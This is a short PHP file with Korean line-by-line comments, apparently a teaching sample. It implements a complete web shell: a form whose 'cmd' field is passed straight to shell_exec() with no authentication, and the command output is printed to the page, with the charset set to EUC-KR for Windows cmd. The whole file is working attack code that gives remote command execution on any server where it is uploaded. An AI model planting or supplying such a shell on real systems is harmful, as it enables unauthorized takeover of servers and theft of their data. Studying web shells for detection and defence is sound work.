<?php
// cmd 의 결과값은 EUC-KR 형식이므로 웹 페이지의 문자 인코딩을 EUC-KR로 설정
header("Content-Type: text/html; charset=EUC-KR");
// 현재 스크립트의 URL 경로를 $page 변수에 저장
$page = $_SERVER["PHP_SELF"];
?>

<form action="<?=$page?>" method="POST">
    <!-- 셸 명령어를 입력받는 텍스트 입력 필드 -->
    <input type="text" name="cmd">
    <!-- 명령어 실행 버튼 -->
    <input type="submit" value="EXECUTE">
</form>
<?php
if (isset($_POST["cmd"])) { // 'cmd' 키가 $_POST 배열에 존재하는지 확인
    $cmd = $_POST["cmd"];
    if (!empty($cmd)) { //// 'cmd' 값이 존재하는지 확인
        // shell_exec()를 통해 사용자 입력 명령어를 실행
        $result = shell_exec($cmd);
        // 명령어 실행 결과의 개행 문자를 HTML 줄바꿈 태그로 변환
        $result = str_replace("\n", "<br>", $result);
        // 명령어 실행 결과를 웹 페이지에 출력
        echo $result;
    }
}
?>
